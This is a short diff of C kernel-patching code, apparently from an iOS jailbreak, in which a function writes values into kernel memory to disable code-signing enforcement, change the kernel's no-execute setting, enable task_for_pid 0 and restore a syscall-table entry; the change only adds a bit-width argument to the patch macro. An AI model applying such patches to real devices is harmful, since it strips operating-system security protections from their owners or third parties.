@@ -150,15 +150,15 @@ static inline void memory_hax() {
 
 extern int ok_go(void *p, void *uap, unsigned int *retval) {
     IOLog("Whoa, I'm here!...\n");
-#   define P(patch) do { *((volatile unsigned int *) CONFIG_##patch) = CONFIG_##patch##_TO; flush_dcache((void *) CONFIG_##patch, 4, false); flush((void *) CONFIG_##patch, 4); } while(0)
+#   define P(patch, bits) do { *((volatile uint##bits##_t *) CONFIG_##patch) = (uint##bits##_t) CONFIG_##patch##_TO; flush_dcache((void *) CONFIG_##patch, bits/8, false); flush((void *) CONFIG_##patch, bits/8); } while(0)
 
-    P(PATCH1);
-    P(PATCH3);
-    P(PATCH4);
-    P(PATCH_CS_ENFORCEMENT_DISABLE);
-    P(PATCH_KERNEL_PMAP_NX_ENABLED);
-    P(PATCH_TFP0);
-    *((unsigned int *) CONFIG_SYSENT_PATCH) = CONFIG_SYSENT_PATCH_ORIG;
+    P(PATCH1, 32);
+    P(PATCH3, 32);
+    P(PATCH4, 32);
+    P(PATCH_CS_ENFORCEMENT_DISABLE, 32);
+    P(PATCH_KERNEL_PMAP_NX_ENABLED, 32);
+    P(PATCH_TFP0, 16);
+    *((uint32_t *) CONFIG_SYSENT_PATCH) = CONFIG_SYSENT_PATCH_ORIG;
     flush((void *) CONFIG_SYSENT_PATCH, 4);
 
     unsigned int copysize = (char *)(&patch_end) - (char *)(&patch_start);
